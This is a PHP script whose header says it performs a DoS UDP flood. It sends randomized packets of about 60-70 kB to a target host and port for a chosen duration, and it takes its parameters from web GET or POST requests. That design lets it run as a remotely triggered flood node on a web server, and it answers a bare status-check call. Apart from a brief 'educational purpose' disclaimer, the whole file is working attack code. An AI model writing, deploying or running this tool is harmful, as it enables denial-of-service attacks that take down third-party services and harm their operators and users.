<?php

/**
 *
 * Script to perform a DoS UDP Flood
 *
 * @author c0re^
 * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2
 *
 * This tool is written on educational purpose, please use it on your own good faith.
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 *
 */

error_reporting(E_ERROR | E_WARNING);

ini_set('max_execution_time', 0);

ini_set('memory_limit', '2048M');

class DoS
{
    const MIN_PACKET_SIZE = 61440; // 60 kB
    const MAX_PACKET_SIZE = 71680; // 70 kB

    /**
     * Target host, e.g. 127.0.0.1
     * @var string
     */
    private $host;

    /**
     * Target port, e.g. 443
     * @var int
     */
    private $port;

    /**
     * Flood time in seconds
     * @var int
     */
    private $time;

    /**
     * Flood time in seconds
     * @var boolean
     */
    private $random;

    /**
     * DoS constructor.
     * @param $host string Target host
     * @param $port int target port
     * @param $time int flood time in Seconds
     * @param $random boolean randomize all packets to avoid packet drops
     */
    public function __construct($host, $port, $time, $random)
    {
        $this->host = $host;
        $this->port = $port;
        $this->time = $time;
        $this->random = $random;
    }

    /**
     * Starts an UPD attack
     * @throws Exception on socket error
     */
    public function flood()
    {
        // pre generate packets to be faster while sending the packets
        $packets = $this->generatePackets($this->random ? 20000 : 1);

        $socket = @fsockopen("udp://$this->host", $this->port, $errorNumber, $errorMessage, 30);
        if (!$socket) {
            throw new Exception($errorMessage);
        }

        $endTime = time() + $this->time;
        while(time() <= $endTime) {
            @fwrite($socket, $packets[array_rand($packets)]);
        }
        @fclose($socket);
    }

    private function generatePackets($size) {
        $packets = array();
        for ($i = 0; $i < $size; $i++) {
            $length = mt_rand(DoS::MIN_PACKET_SIZE, Dos::MAX_PACKET_SIZE);
            $packets[] = bin2hex(openssl_random_pseudo_bytes($length / 2));
        }
        return $packets;
    }
}

class Application
{
    public static function start($args)
    {
        if (sizeof($args) === 0) {
            echo json_encode(array("status" => "ok"));
            return;
        }

        $host = $args['host'];
        $port = isset($args['port']) ? intval($args['port']) : 80;
        $time = isset($args['time']) ? intval($args['time']) : 60;
        $random = isset($args['random']) ? boolval($args['random']) : false;

        $result = null;
        try {
            $dos = new DoS($host, $port, $time, $random);
            $dos->flood();

            $result = array("success" => "true");
        } catch (Exception $e) {
            $result = array("success" => "false", "message" => $e->getMessage());
        }

        echo json_encode($result);
    }
}

Application::start($_POST ? $_POST : $_GET);